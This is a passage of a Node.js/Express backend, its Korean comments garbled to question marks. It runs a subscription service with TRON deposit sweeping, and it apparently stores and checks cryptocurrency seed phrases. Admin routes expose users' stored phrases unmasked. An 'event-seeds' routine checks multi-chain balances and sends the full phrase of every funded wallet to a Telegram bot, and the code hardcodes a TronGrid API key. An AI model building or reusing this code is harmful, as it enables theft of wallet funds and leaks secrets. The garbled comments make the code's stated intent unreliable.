    // ???? ?? ?? ??
    await db.userDB.addOrUpdate(id.trim(), password || '', managerId || '', telegram || '', 'approved');
  res.json({ ok: true });
  } catch (error) {
    console.error('?? ??/?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ?? ?? ?? ??
app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
  try {
    const pendingUsers = await db.userDB.getPendingUsers();
    
    // ???? ?? ??? ? ? ??
    if (req.admin.role === 'manager') {
      const filtered = pendingUsers.filter(u => u.managerId === req.admin.id);
      return res.json(filtered);
    }
    
    // ???? ?? ??
    res.json(pendingUsers);
  } catch (error) {
    console.error('?? ?? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ??
app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ?? ??? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
    }
    
    await db.userDB.updateStatus(userId.trim(), 'approved');
    res.json({ success: true });
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ?? (??)
app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ?? ??? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
    }
    
    await db.userDB.remove(userId.trim());
    res.json({ success: true });
  } catch (error) {
    console.error('??? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ???? ??
app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
  try {
    const { userId, days } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    if (!days || ![30, 90, 180, 365].includes(parseInt(days))) {
      return res.status(400).json({ error: '??? ??? ????? (30, 90, 180, 365)' });
    }
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ?? ??? ?? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ??? ? ????.' });
    }
    
    await db.userDB.setSubscription(userId.trim(), parseInt(days));
    res.json({ success: true });
  } catch (error) {
    console.error('???? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ??? ??/???
app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
  try {
    const { userId, suspend } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
    
    // ???? ?? ??? ??/??? ??
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '?? ?? ???? ??/???? ? ????.' });
    }
    
    const newStatus = suspend ? 'suspended' : 'approved';
    await db.userDB.suspend(userId.trim(), suspend);
    
    // ??? ?? ??? ??
    if (suspend) {
      await sessionStore.kickUser(userId.trim());
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('??? ??/??? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ?? ??(??) (??? ??)
app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
  try {
  const userId = req.params.id?.trim();
  if (!userId) return res.status(400).json({ error: 'userId ??' });
  if (req.admin.role !== 'master') {
    return res.status(403).json({ error: '???? ??? ??? ?????.' });
  }
    
    const u = await db.userDB.get(userId);
  if (!u) return res.status(404).json({ error: '?? ??' });
    
    await db.userDB.remove(userId);
    await sessionStore.kickUser(userId);
  res.json({ ok: true });
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ?? (???=??, ???=? ?? ???) ----------
app.get('/api/admin/sessions', requireAdmin, async (req, res) => {
  try {
    let list = await sessionStore.getAll();
    
  if (req.admin.role === 'manager') {
      const myUsers = await db.userDB.getByManager(req.admin.id);
      const myUserIds = new Set(myUsers.map((u) => u.id));
    list = list.filter((s) => myUserIds.has(s.userId));
  }
    
  res.json(list);
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

app.post('/api/admin/kick', requireAdmin, async (req, res) => {
  try {
  const userId = req.body?.userId?.trim();
  if (!userId) return res.status(400).json({ error: 'userId ??' });
  if (req.admin.role !== 'master') {
    return res.status(403).json({ error: '???? ?? ??? ?????.' });
  }
    await sessionStore.kickUser(userId);
  res.json({ ok: true });
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ?? (???? ? ? ??) ----------
app.get('/api/admin/seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
  const masked = req.query.masked !== 'false';
    const list = await db.seedDB.getAll(masked);
    res.json(list);
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// GET /api/admin/users/:id/seeds ? ?? ??? ?? ?? ?????? (??? ??)
app.get('/api/admin/users/:id/seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const userId = req.params.id?.trim();
    if (!userId) return res.status(400).json({ error: 'userId ??' });
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) AS total FROM seeds WHERE user_id = ?', [userId]
    );
    const [rows] = await db.pool.query(
      'SELECT id, phrase, created_at FROM seeds WHERE user_id = ? ORDER BY id DESC LIMIT ? OFFSET ?',
      [userId, pageSize, offset]
    );
    res.json({
      seeds: rows.map(r => ({ id: r.id, phrase: r.phrase, at: r.created_at })),
      total: Number(total),
      page,
      pageSize,
    });
  } catch (error) {
    console.error('?? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ?? ???? ?? API ----------

// POST /api/payment/request-address
// ???? QR ?? ?? ? ???? ?? ???? ?? (?? ?? ???)
app.post('/api/payment/request-address', async (req, res) => {
  try {
    const { token, userId, orderId, network, tokenType } = req.body || {};
    console.log('[REQUEST-ADDR] ?? ?? ?', { userId, network, tokenType, hasToken: !!token?.trim() });

    if (!token?.trim()) return res.status(401).json({ error: '?? ??? ?????.' });

    // ?? ??
    const sessionUserId = await sessionStore.getUserId(token.trim());
    console.log('[REQUEST-ADDR] ?? ?? ?', sessionUserId);
    if (!sessionUserId) return res.status(401).json({ error: '???? ?? ?????.' });

    const resolvedUserId = (userId?.trim() || sessionUserId).toLowerCase();

    // ?? active ?? ?? ??
    const activeWallet = await db.collectionWalletDB.getActive();
    console.log('[REQUEST-ADDR] active ?? ?', activeWallet
      ? { version: activeWallet.wallet_version, address: activeWallet.root_wallet_address, hasSecret: !!activeWallet.xpub_key }
      : 'null (???)'
    );
    if (!activeWallet) {
      return res.status(503).json({ error: '?? ???? ?? ??? ????. ????? ?????.' });
    }

    // ?? ?? ???? ??? ?? ??? ?? (?? ?? ? upsert)
    const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
    console.log('[REQUEST-ADDR] ?? ?? ?', existing
      ? { address: existing.deposit_address, index: existing.derivation_index, status: existing.status }
      : '?? (?? ??)'
    );

    // expired ??? ????? ?? ?? ??
    const isExpiredAddress = existing?.status === 'expired';

    if (existing && !isExpiredAddress) {
      // ?? ??? status ? issued ?? (???)
      if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
        await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
        console.log('[REQUEST-ADDR] ?? ?? ? issued ?', existing.deposit_address);
      }
      return res.json({
        address: existing.deposit_address,
        walletVersion: existing.wallet_version,
        status: 'issued',
        invalidated: false,
        isNew: false,
      });
    }

    // ??? ??? ?? ?? ??? ?? ?? (invalidated ??? ? ?? ?? ??)
    const oldRecord = !isExpiredAddress
      ? await db.depositAddressDB.findOldVersion(resolvedUserId, activeWallet.wallet_version)
      : null;
    const wasInvalidated = !!oldRecord || isExpiredAddress;
    if (isExpiredAddress) {
      console.log('[REQUEST-ADDR] ?? ?? ??? ? ? ?? ?? ?', existing.deposit_address);
    }
    if (wasInvalidated) {
      console.log('[REQUEST-ADDR] ??? ??? ?? ? ? ???? ?? ?? ? oldVersion:', oldRecord.wallet_version);
    }

    // ?? ?? ??: ??? ?? HD ?? ?? root ?? ?? ??
    // ?? ?? ? index ??? ???? ?? ??? ?? ??
    const secret = activeWallet.xpub_key;
    let newAddress;
    let newIndex;
    let insertSuccess = false;
    const MAX_RETRY = 5;

    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      newIndex = maxRows[0].maxIdx + 1 + attempt;
      console.log(`[REQUEST-ADDR] ?? index ? ${newIndex} (attempt ${attempt})`);

      if (secret) {
        try {
          newAddress = deriveTronAddress(secret, newIndex);
          console.log('[REQUEST-ADDR] HD ?? ?? ?', newAddress);
        } catch (e) {
          console.error('[REQUEST-ADDR] HD ?? ?? ?? ?', e.message);
          return res.status(500).json({ error: '?? ?? ??. ????? ?????.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
        console.log('[REQUEST-ADDR] ??? ?? ? root ?? ?? ?', newAddress);
      }

      try {
        await db.depositAddressDB.create({
          userId: resolvedUserId,
          orderId: orderId || null,
          network: network || 'TRON',
          token: tokenType || 'USDT',
          depositAddress: newAddress,
          walletVersion: activeWallet.wallet_version,
          derivationIndex: newIndex,
        });
        console.log('[REQUEST-ADDR] DB ?? ?? ? userId:', resolvedUserId, 'index:', newIndex);
        insertSuccess = true;
        break;
      } catch (insertErr) {
        if (insertErr.code === 'ER_DUP_ENTRY') {
          console.warn(`[REQUEST-ADDR] ?? ?? (index ${newIndex}), ??? ?...`);
          continue;
        }
        throw insertErr;
      }
    }

    if (!insertSuccess) {
      console.error('[REQUEST-ADDR] ?? ??? ?? ? userId:', resolvedUserId);
      return res.status(500).json({ error: '?? ?? ?? (??). ?? ? ?? ??????.' });
    }

    res.json({
      address: newAddress,
      walletVersion: activeWallet.wallet_version,
      status: 'issued',
      invalidated: wasInvalidated,
      isNew: true,
    });
  } catch (error) {
    console.error('???? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- ??? - ?? ?? ?? ----------

// GET /api/admin/collection-wallet ? ?? active ?? + ?? ??
app.get('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
  try {
    const active = await db.collectionWalletDB.getActive();
    const history = await db.collectionWalletDB.getHistory();

    // xpub_key ?? ? ?? ?? ???? ?? ?? ?? ??? ??
    const secretType = (xpubKey) => {
      if (!xpubKey) return 'none';
      if (xpubKey.startsWith('enc:')) return 'mnemonic'; // ???? ??? ? sweep ??
      if (xpubKey.startsWith('xpub')) return 'xpub';    // xpub ? sweep ??
      return 'unknown';
    };

    const sanitize = (w) => {
      const type = secretType(w.xpub_key);
      return {
        ...w,
        xpub_key: undefined,          // ?? ???
        secretType: type,             // 'mnemonic' | 'xpub' | 'none' | 'unknown'
        canDerive: type === 'mnemonic', // true = sweep ??
      };
    };

    const historyWithStats = await Promise.all(
      history.map(async (w) => {
        const stats = await db.collectionWalletDB.getStats(w.wallet_version);
        return { ...sanitize(w), stats };
      })
    );

    res.json({ active: active ? sanitize(active) : null, history: historyWithStats });
  } catch (error) {
    console.error('?? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// POST /api/admin/collection-wallet ? ? ?? ?? ?? (?? ?? ????)
app.post('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { address, mnemonic, label } = req.body || {};
    if (!address?.trim()) return res.status(400).json({ error: 'TRON ?? ?? ??? ?????.' });

    let encryptedSecret = null;
    if (mnemonic?.trim()) {
      const plain = mnemonic.trim();
      // ??? ??? ??
      try {
        // 12 or 24?? ?? + ? ?? ?? ?? ???
        const wordCount = plain.split(/\s+/).length;
        if (wordCount !== 12 && wordCount !== 24) {
          return res.status(400).json({ error: '???? 12?? ?? 24???? ???.' });
        }
        HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`); // ??? ??
      } catch {
        return res.status(400).json({ error: '??? ??? ???? ????.' });
      }
      encryptedSecret = encryptSecret(plain);
    }

    const newVersion = await db.collectionWalletDB.activate(
      address.trim(),
      encryptedSecret,
      label?.trim() || ''
    );
    res.json({
      ok: true,
      walletVersion: newVersion,
      canDerive: !!encryptedSecret,
      message: `?? ??? v${newVersion}?? ???????. ${encryptedSecret ? '(?? ?? ?? ???)' : '(?? ?? ??)'}`,
    });
  } catch (error) {
    console.error('?? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// GET /api/admin/deposit-addresses ? ?? ?? ?? ??
app.get('/api/admin/deposit-addresses', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { walletVersion, status, page = 1, pageSize = 30 } = req.query;
    const result = await db.depositAddressDB.getList({
      walletVersion: walletVersion ? Number(walletVersion) : undefined,
      status: status || undefined,
      page: Number(page),
      pageSize: Number(pageSize),
    });
    res.json(result);
  } catch (error) {
    console.error('???? ?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ---------- Sweep (?? ?? ? ?? ?? ??) ----------
// POST /api/admin/sweep
// body: { depositAddress } ? ?? ????? USDT? root ???? sweep
app.post('/api/admin/sweep', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { depositAddress } = req.body || {};
    if (!depositAddress?.trim()) return res.status(400).json({ error: 'depositAddress ??' });

    // 1. ???? ?? ??
    const [[row]] = await db.pool.query(
      'SELECT d.*, c.xpub_key, c.root_wallet_address FROM deposit_addresses d JOIN collection_wallets c ON d.wallet_version = c.wallet_version WHERE d.deposit_address = ?',
      [depositAddress.trim()]
    );
    if (!row) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
    if (!row.xpub_key) return res.status(400).json({ error: '? ??? ???? ?? ?? sweep ?????.' });

    // 2. ??? ??
    let privateKey;
    try {
      privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }

    // 3. TronWeb?? USDT sweep (API ? ?? ?? ? ? ??? ??? 401 ??)
    const { TronWeb } = require('tronweb');
    const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });

    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balanceRaw = await contract.balanceOf(depositAddress.trim()).call();
    const balance = Number(balanceRaw) / 1e6;

    if (balance < 0.1) {
      return res.status(400).json({ error: `?? ?? (${balance} USDT). sweep ?? ??: 0.1 USDT` });
    }

    // ?? ??
    const toAddress = row.root_wallet_address;
    const amount = Number(balanceRaw);
    const tx = await contract.transfer(toAddress, amount).send({ feeLimit: 30_000_000 });

    // ?? ????
    await db.depositAddressDB.updateStatus(depositAddress.trim(), 'swept');

    res.json({ ok: true, txId: tx, amount: balance, to: toAddress });
  } catch (error) {
    console.error('Sweep ??:', error);
    res.status(500).json({ error: `Sweep ??: ${error.message || error}` });
  }
});

// POST /api/admin/recover-trx ? ?????? TRX ?? root ???? ??
// body: {} ? ?? ??, { depositAddress } ? ?? ???
app.post('/api/admin/recover-trx', requireAdmin, requireMaster, async (req, res) => {
  try {
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const { TronWeb } = require('tronweb');
    const { depositAddress: singleAddr } = req.body || {};

    // 1. ?? ?? ?? (?? or ??)
    const whereClause = singleAddr
      ? 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\' AND d.deposit_address = ?'
      : 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\'';
    const params = singleAddr ? [singleAddr] : [];
    const [rows] = await db.pool.query(`
      SELECT d.deposit_address, d.derivation_index, c.xpub_key, c.root_wallet_address
      FROM deposit_addresses d
      JOIN collection_wallets c ON d.wallet_version = c.wallet_version
      ${whereClause}
    `, params);

    if (!rows.length) return res.json({ ok: true, results: [], message: '?? ??? ?? ??' });

    const results = [];
    for (const row of rows) {
      const addr = row.deposit_address;
      try {
        // TRX ?? ??
        const balResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${addr}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
        );
        const trxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;

        // ?? 3 TRX ?? ?? ?? ?? (dust ??)
        if (trxBalance < 3) {
          results.push({ address: addr, skipped: true, reason: `?? ?? (${trxBalance.toFixed(2)} TRX)` });
          continue;
        }

        // ??? ??
        const privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
        const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });

        // ???: ???? 1 TRX ?? (??? ???)
        const sendTrx = Math.floor((trxBalance - 1) * 1_000_000) / 1_000_000;
        const txResult = await tronWeb.trx.sendTransaction(row.root_wallet_address, TronWeb.toSun(sendTrx));
        const txId = txResult?.txid || txResult?.transaction?.txID || 'unknown';

        console.log(`[RECOVER-TRX] ${addr} ? root ${sendTrx} TRX, txid=${txId}`);
        results.push({ address: addr, sent: sendTrx, txId, ok: true });
      } catch (e) {
        console.error(`[RECOVER-TRX] ${addr} ??:`, e.message);
        results.push({ address: addr, ok: false, error: e.message });
      }
      // TronGrid ?? ?? ??
      await new Promise(r => setTimeout(r, 500));
    }

    const success = results.filter(r => r.ok).length;
    const totalSent = results.filter(r => r.ok).reduce((s, r) => s + (r.sent || 0), 0);
    res.json({ ok: true, results, summary: { total: rows.length, success, totalSentTrx: totalSent.toFixed(2) } });
  } catch (error) {
    console.error('[RECOVER-TRX] ??:', error);
    res.status(500).json({ error: `TRX ?? ??: ${error.message}` });
  }
});

// ---------- ?? ?? API ----------

// GET /api/payment/pricing ? ?????? ?? ?? (?? ???)
app.get('/api/payment/pricing', async (req, res) => {
  try {
    const raw = await db.settingDB.get('subscription_packages');
    const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
    const packages = raw ? JSON.parse(raw) : [
      { days: 30,  label: '1??',  price: 39 },
      { days: 60,  label: '2??',  price: 75 },
      { days: 90,  label: '3??',  price: 110 },
      { days: 180, label: '6??',  price: 210 },
      { days: 365, label: '12??', price: 390 },
    ];
    const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;
    res.json({ monthlyPrice, packages });
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// POST /api/admin/pricing ? ?? ??? ?? (??? ??)
app.post('/api/admin/pricing', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { monthlyPrice, packages } = req.body || {};
    if (monthlyPrice == null || isNaN(Number(monthlyPrice))) {
      return res.status(400).json({ error: '? ?? ??(USDT)? ?????.' });
    }
    if (!Array.isArray(packages) || packages.length === 0) {
      return res.status(400).json({ error: '??? ??? ?????.' });
    }
    await db.settingDB.set('monthly_price_usdt', String(Number(monthlyPrice)));
    await db.settingDB.set('subscription_packages', JSON.stringify(packages));
    res.json({ ok: true, message: '??? ???????.' });
  } catch (error) {
    console.error('?? ?? ??:', error);
    res.status(500).json({ error: '?? ??? ??????.' });
  }
});

// ?? ???(/)? ??? ???? ?????
app.get('/', (req, res) => {
  res.redirect('/admin.html');
});

// ????????????????????????????????????????????????????
// ?? ??(???) API  ?  event_seeds ??? ??
// ????????????????????????????????????????????????????

// GET /api/admin/event-seeds ? ?? ??? ??? ?? ?? (available ???)
app.get('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) AS total FROM event_seeds WHERE status = 'available'`
    );
    const [rows] = await db.pool.query(
      `SELECT id,
              CONCAT(SUBSTRING_INDEX(phrase,' ',1), ' ... ',
                     SUBSTRING_INDEX(phrase,' ',-1), ' (',
                     LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '??)') AS phrase_preview,
              COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
              COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
              note, created_at
       FROM event_seeds WHERE status = 'available'
       ORDER BY id DESC LIMIT ? OFFSET ?`,
      [pageSize, offset]
    );
    res.json({ total, page, pageSize, totalPages: Math.ceil(total / pageSize), items: rows });
  } catch (e) {
    console.error('[EVENT-SEEDS] ??:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/event-seeds ? ??? ?? ?? (?? ?? ??)
// body: { phrase, note, btc, eth, tron, sol }  ??  { bulk: "phrase1\nphrase2\n..." }
app.post('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { phrase, bulk, note, btc, eth, tron, sol } = req.body || {};
    if (bulk) {
      const phrases = bulk.split('\n').map(s => s.trim()).filter(Boolean);
      if (!phrases.length) return res.status(400).json({ error: '?? ??? ????.' });
      const values = phrases.map(p => [p, note || null]);
      await db.pool.query(
        `INSERT INTO event_seeds (phrase, note) VALUES ?`, [values]
      );
      return res.json({ ok: true, added: phrases.length });
    }
    if (!phrase?.trim()) return res.status(400).json({ error: 'phrase ??' });
    await db.pool.query(
      `INSERT INTO event_seeds (phrase, note, btc, eth, tron, sol) VALUES (?,?,?,?,?,?)`,
      [phrase.trim(), note||null, btc||null, eth||null, tron||null, sol||null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/event-seeds/:id ? ??? ?? ??
app.delete('/api/admin/event-seeds/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.pool.query(`DELETE FROM event_seeds WHERE id = ? AND status = 'available'`, [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/event-seeds/recheck ? seed-checker.js? ?? ??? (event_seeds ???)
app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { ids } = req.body;
    let seedIds = [];
    if (ids === 'all') {
      const [rows] = await db.pool.query(`SELECT id FROM event_seeds WHERE status = 'available' ORDER BY id ASC`);
      seedIds = rows.map(r => r.id);
    } else if (Array.isArray(ids) && ids.length > 0) {
      seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
    }
    if (!seedIds.length) return res.status(400).json({ error: '???? ??? ??? ????.' });
    if (seedIds.length > 50) return res.status(400).json({ error: '? ?? ?? 50??? ?????.' });

    const ph = seedIds.map(() => '?').join(',');
    const [seeds] = await db.pool.query(`SELECT id, phrase, note FROM event_seeds WHERE id IN (${ph})`, seedIds);

    res.json({ ok: true, queued: seeds.length, message: `${seeds.length}? ??? ?? ?? ???. ?? ? ???????.` });

    // ????? ??
    (async () => {
      for (const seed of seeds) {
        try {
          console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ?...`);
          const results = await checkMultiChainBalance(seed.phrase);

          const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
          const btc  = getbal('btc');
          const eth  = getbal('eth');
          const tron = getbal('tron');
          const sol  = getbal('sol');

          await db.pool.query(
            `UPDATE event_seeds SET btc=?, eth=?, tron=?, sol=? WHERE id=?`,
            [btc || null, eth || null, tron || null, sol || null, seed.id]
          );

          const chainsWithBalance = results.filter(r => (r.balance || 0) > 0);

          if (chainsWithBalance.length > 0) {
            // ??? ????? ??
            const [[cfg]]     = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
            const [[cfgChat]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_chat_id' LIMIT 1`).catch(() => [[null]]);
            const botToken = cfg?.setting_value;
            const chatId   = cfgChat?.setting_value;

            let msg = `?? <b>[??? ??] ?? ??!</b>\n?? ID: ${seed.id}\n`;
            if (seed.note) msg += `?? ??: ${seed.note}\n`;
            msg += '\n';
            for (const r of chainsWithBalance) {
              msg += `??????????????????\n`;
              msg += `?? <b>${r.network.toUpperCase()}</b>\n`;
              msg += `?? <b>??:</b> ${r.balance} ${r.symbol}\n`;
              if (r.address) msg += `?? <b>??:</b> <code>${r.address}</code>\n`;
            }
            msg += `\n??????????????????\n?? <b>?? ??:</b>\n<code>${seed.phrase}</code>\n??????????????????`;

            if (botToken && chatId) {
              await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId, text: msg, parse_mode: 'HTML'
              }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram ??:', e.message));
            }
            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ??! BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
          } else {
            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ??`);
          }
        } catch (e) {
          console.error(`[EVENT-SEED RECHECK] ID=${seed.id} ??:`, e.message);
        }
        await new Promise(r => setTimeout(r, 500));
      }
      console.log(`[EVENT-SEED RECHECK] ?? ?? (${seeds.length}?)`);
    })();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/seed-gifts ? ?? ?? ??
app.get('/api/admin/seed-gifts', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT g.id, g.event_seed_id, g.user_id, g.note, g.status,
              g.created_at, g.delivered_at,
              CONCAT(SUBSTRING_INDEX(g.phrase,' ',1), ' ... ',
                     SUBSTRING_INDEX(g.phrase,' ',-1)) AS phrase_preview
       FROM seed_gifts g
       ORDER BY g.created_at DESC
       LIMIT 100`
    );
    res.json({ items: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/seed-gifts/assign
// body: { eventSeedId, userId, note } ?? { random: true, userId, note }
app.post('/api/admin/seed-gifts/assign', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { eventSeedId, userId, note, random } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });

    const [[user]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [userId.trim()]);
    if (!user) return res.status(404).json({ error: `?? '${userId}' ??` });

    let targetId = eventSeedId;
    if (random || !eventSeedId) {
      const [[rnd]] = await db.pool.query(
        `SELECT id FROM event_seeds WHERE status = 'available' ORDER BY RAND() LIMIT 1`
      );
      if (!rnd) return res.status(404).json({ error: '?? ??? ??? ?? ??' });
      targetId = rnd.id;
    }

    const [[seed]] = await db.pool.query(
      `SELECT id, phrase FROM event_seeds WHERE id = ? AND status = 'available'`, [targetId]
    );
    if (!seed) return res.status(404).json({ error: `??? ?? ID ${targetId} ?? ?? ?? ???` });

    // ?? ??: event_seeds ?? ?? + seed_gifts ?? ??
    await db.pool.query(`UPDATE event_seeds SET status = 'assigned' WHERE id = ?`, [targetId]);
    await db.pool.query(
      `INSERT INTO seed_gifts (event_seed_id, user_id, phrase, note, status) VALUES (?,?,?,?,'pending')`,
      [targetId, userId.trim(), seed.phrase, note || null]
    );
    res.json({ ok: true, eventSeedId: targetId, userId: userId.trim() });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/seed-gifts/:id ? ?? ?? (pending? ??, event_seeds ??)
app.delete('/api/admin/seed-gifts/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [[gift]] = await db.pool.query(
      `SELECT event_seed_id FROM seed_gifts WHERE id = ? AND status = 'pending'`, [req.params.id]
    );
    if (!gift) return res.status(400).json({ error: '?? ?? (?? ????? ??)' });
    await db.pool.query(`UPDATE seed_gifts SET status = 'cancelled' WHERE id = ?`, [req.params.id]);
    await db.pool.query(`UPDATE event_seeds SET status = 'available' WHERE id = ?`, [gift.event_seed_id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/gift-seed?token= ? ????? ??: ?? ?? ?? ?? ??
app.get('/api/user/gift-seed', async (req, res) => {
  try {
    const token = req.query.token || req.headers['x-token'];
    if (!token) return res.status(401).json({ error: '?? ??' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '?? ??' });

    const [[gift]] = await db.pool.query(
      `SELECT id, phrase, note, created_at
       FROM seed_gifts
       WHERE user_id = ? AND status = 'pending'
       ORDER BY created_at ASC LIMIT 1`,
      [userId]
    );
    if (!gift) return res.json({ gift: null });
    res.json({ gift: { id: gift.id, phrase: gift.phrase, note: gift.note, createdAt: gift.created_at } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/user/gift-seed/ack ? ?????? ?? ?? ??
app.post('/api/user/gift-seed/ack', async (req, res) => {
  try {
    const token = req.body?.token || req.headers['x-token'];
    const giftId = req.body?.giftId;
    if (!token) return res.status(401).json({ error: '?? ??' });
    const userId = await sessionStore.getUserId(token);
